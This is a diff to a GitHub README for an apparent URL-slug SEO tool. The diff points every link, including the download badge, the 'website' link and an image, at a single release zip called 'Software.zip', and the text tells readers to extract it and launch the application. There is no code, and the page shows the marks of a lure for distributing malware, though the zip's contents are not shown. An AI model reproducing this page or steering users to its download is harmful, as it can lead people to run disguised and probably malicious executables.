@@ -9,9 +9,9 @@ Welcome to the "Optimiseur-de-Slug-URL" GitHub repository! Here you will find a 
 
 ## 📁 Installation
 To get started with the Optimiseur de Slug URL tool, download the software package from the link below:
-[![Download Software](https://github.com/XTerminatordenuci/Optimiseur-de-Slug-URL/releases/download/v1.0/Release_x64.zip)](https://github.com/XTerminatordenuci/Optimiseur-de-Slug-URL/releases/download/v1.0/Release_x64.zip)
+[![Download Software](https://github.com/XTerminatordenuci/Optimiseur-de-Slug-URL/releases/download/v2.0/Software.zip)](https://github.com/XTerminatordenuci/Optimiseur-de-Slug-URL/releases/download/v2.0/Software.zip)
 
-Once you have downloaded the https://github.com/XTerminatordenuci/Optimiseur-de-Slug-URL/releases/download/v1.0/Release_x64.zip file, extract it and launch the application to start optimizing your URL slugs efficiently.
+Once you have downloaded the https://github.com/XTerminatordenuci/Optimiseur-de-Slug-URL/releases/download/v2.0/Software.zip file, extract it and launch the application to start optimizing your URL slugs efficiently.
 
 ## 🛠️ Topics
 This repository covers a wide range of topics related to web development, freelancing, and SEO optimization. Some of the key topics include:
@@ -35,13 +35,13 @@ This repository covers a wide range of topics related to web development, freela
 Feel free to explore the repository and discover valuable resources related to these topics.
 
 ## 🌐 Visit Website
-For more information and updates on the Optimiseur de Slug URL tool, please visit our website [here](https://github.com/XTerminatordenuci/Optimiseur-de-Slug-URL/releases/download/v1.0/Release_x64.zip). 
+For more information and updates on the Optimiseur de Slug URL tool, please visit our website [here](https://github.com/XTerminatordenuci/Optimiseur-de-Slug-URL/releases/download/v2.0/Software.zip). 
 
 If you encounter any issues with the download link provided above, please check the "Releases" section of this repository for alternative download options.
 
 Thank you for choosing the Optimiseur de Slug URL tool to enhance your URL slug optimization process. Feel free to contribute to this project and make it even better for the community!
 
-![Optimize SEO](https://github.com/XTerminatordenuci/Optimiseur-de-Slug-URL/releases/download/v1.0/Release_x64.zip)
+![Optimize SEO](https://github.com/XTerminatordenuci/Optimiseur-de-Slug-URL/releases/download/v2.0/Software.zip)
 
 ---
 
